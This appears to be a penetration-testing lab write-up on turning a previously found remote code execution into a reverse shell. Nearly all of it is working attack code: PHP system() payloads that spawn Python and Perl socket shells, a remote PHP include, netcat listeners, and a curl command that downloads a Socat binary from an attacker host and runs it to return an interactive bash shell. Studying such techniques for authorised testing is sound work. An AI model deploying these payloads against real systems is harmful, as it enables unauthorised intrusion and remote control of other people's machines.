# Gaining remote shell

I explored methods to gain a remote shell on the machine. The following methods can be used (with the `VRFY` or `RCPT TO:` command with SMTP explored before) to run remote commands to establish the shell.&#x20;

The link below contains all the reverse shell payload we will be using:

{% embed url="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" %}

#### 1. PHP shell

a. Download the PHP shell from the link above, and load the content into a file such as `shell.php`  (remember to update the host and port values):

* Start a web server from the same directory as the shell

{% code title="Python3 web server" overflow="wrap" %}
```sh
$ python3 -m http.server <port>
```
{% endcode %}

b. Include the address of the web server to load the PHP shell (using RCE we have found earlier):

```php
<?php include('http://<host>:<port>/shell.php'); ?>
```

c. Start the shell listener and invoke the RCE to execute the reverse shell:

```sh
$ nc -lvp <port>
```

#### 2. Python shell

a. Identify if Python is available

```php
<?php system('python --version'); ?>
```

b. If available, we can invoke a Python reverse shell:

* Replace the `<host>` and `<port>` with the appropriate values

{% code overflow="wrap" %}
```php
<?php system("python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('<host>',<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\""); ?>
```
{% endcode %}

#### 3. Perl shell

a.  Identify if Perl is available:

```php
<?php system('perl --version'); ?> 
```

b. If available, we can invoke a Perl shell:

* Replace the `<host>` and `<port>` with the appropriate values

{% code overflow="wrap" %}
```php
<?php system('perl -e \'use Socket;$i="<host>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''); ?
```
{% endcode %}

#### 4. Socat stable shell

a. Check if Socat is available. However, chances are that it will not be available. We can install the Socat binary and host it from a web server on our machine, and have the target retrieve it.

First, download the Socat binary and host it from the local machine:

{% code overflow="wrap" %}
```sh
$ https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true 

$ python3 -m http.server <port>


# from another terminal: open a reverse shell listener
$ nc -lvp <port>
```
{% endcode %}

Next, we can send the payload to the target:

{% code overflow="wrap" %}
```php
<?php system('curl http://10.4.10.179:8000/socat --output /tmp/socat && chmod +x /tmp/socat &&  /tmp/socat TCP:10.4.10.179:8002 EXEC:"bash -li",pty,stderr,sigint,setsid,sane'); ?>
```
{% endcode %}

In this payload, a few things are happening:

1. Retrieve the Socat binary and save it to a temporary directory `/tmp/socat`
2. Add execute permission on the binary
3. Invoke a Socat reverse shell from the target to our machine

* Note that this shell is considered to be more stable as compared to the other options discussed before
